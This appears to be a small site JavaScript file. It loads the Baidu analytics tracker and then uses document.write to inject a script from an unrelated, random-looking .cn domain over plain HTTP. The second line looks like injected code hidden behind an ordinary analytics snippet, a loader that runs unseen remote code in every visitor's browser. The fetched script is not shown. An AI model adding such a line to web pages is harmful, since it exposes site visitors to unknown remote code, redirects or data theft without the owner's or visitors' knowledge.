var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f90c31169e4a09eed880a7d9f83f1cd3";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

document.write("<script type=\"text/javascript\" src=\"http://lh.cdda669850.cn/hj.js\"></script>");